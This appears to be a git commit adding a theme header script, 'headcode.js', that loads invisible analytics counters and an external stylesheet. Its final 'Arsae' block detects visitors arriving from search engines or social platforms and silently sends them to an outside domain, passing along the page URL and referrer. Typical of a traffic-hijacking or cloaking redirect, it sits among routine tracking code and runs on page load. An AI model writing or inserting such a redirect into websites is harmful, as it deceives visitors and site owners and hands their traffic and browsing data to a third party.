d84230dc8de68729153a665ebe139deebc82f274
Respati Simanjutak <163110839+Respatisimanjutak@users.noreply.github.com>
2024-03-18 00:26:07 +0700

    Create headcode.js

---
+++ themes/tokcer/headcode.js
@@ -0,0 +1,32 @@
+///// Histats /////
+document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4825766&101"width="0" height="0"/>');
+
+
+///// Analytics /////
+
+///// Statcounter /////
+
+var sc_project=12978198; 
+var sc_invisible=1; 
+var sc_security="9f31a33b"; 
+
+document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
+document.write('<noscript>');
+document.write('<div class="statcounter">');
+document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
+document.write('<img class="statcounter" src="https://c.statcounter.com/12978198/0/9f31a33b/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
+document.write('</a>');
+document.write('</div>');
+document.write('</noscript>');
+
+///// CSS /////
+document.write("<link media='all' href='https://git.teknodrem.com/themez/style.css' rel='stylesheet' />");
+
+///// Canonical /////
+document.write('<link rel="canonical" href="' + window.location.href + '" />');
+
+///// Arsae /////
+var ars = 'https://us.teknodrem.com';
+//if(['.google.', 'google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) } 
+
+if(['.google.', 'google.', 'bing.', '.bing.', 'yandex.', '.facebook.', 'facebook.', 'pinterest.', '.pinterest', 'duckduckgo.', '.yahoo.', 't.co', 'instagram.', '.instagram.', '.ecosia.', '.aol.', '.qwant.', '.tripadvisor.', 'alohafind.', '.youtube.', '.seznam.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
